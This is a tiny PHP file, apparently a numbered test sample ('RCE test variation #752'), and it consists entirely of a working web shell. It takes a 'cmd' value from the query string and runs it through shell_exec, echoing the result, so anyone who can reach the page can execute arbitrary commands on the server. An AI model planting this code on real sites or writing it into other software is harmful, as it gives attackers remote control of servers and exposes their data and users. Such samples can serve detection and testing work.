<?php
// RCE test variation #752
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>